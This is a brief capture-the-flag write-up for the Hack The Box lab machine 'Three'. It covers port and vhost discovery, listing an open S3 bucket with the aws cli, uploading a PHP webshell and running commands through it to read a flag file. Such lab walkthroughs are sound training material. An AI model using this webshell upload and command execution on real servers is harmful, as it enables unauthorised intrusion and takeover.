# HTB Starting Point Tier 1 - Three

- IP Provided - 10.129.180.49

## Recon and Discovery

- nmap found - 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
						  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
- gobuster found - s3.thetopper.htb 
						 
## Analysis and Exploitation

- We go to the website and see that `thetoppers.htb` is mentioned in the contact section
- We add `<ip> thetopper.htb` to `/etc/hosts`
- We see that gobuster found a vhost `s3` and we add `s3.thetopper.htb` in `/etc/hosts` along side `thetopper.htb`
	- Tips: Use gobuster in vhost mode
- Going to `s3.thetopper.htb` we see `Status Running`
- We use aws cli command `aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb` to list the files
	- Tips: Doing it first will cause an error, run `aws configure` and put random values to complete the wizard
- We can see that we have access to files, we can upload files too
- We try to upload a webshell with `aws s3 --endpoint=http://s3.thetoppers.htb cp shell.php s3://thetoppers.htb`
	- You can find a php webshell in `payloadallthethings`, use `locate shell.php`
- Now by visiting `http://thetoppers.htb/shell.php?cmd=ls` we can see the contents of directory which mean our webshell works
- We try to `ls ../` we can see `flag.txt` 
- We use `cat ../flag.txt` to reveal the flag

## Difficulty - Very Easy

- Machine introduces s3 buckets, aws cli, insecure file upload and webshells
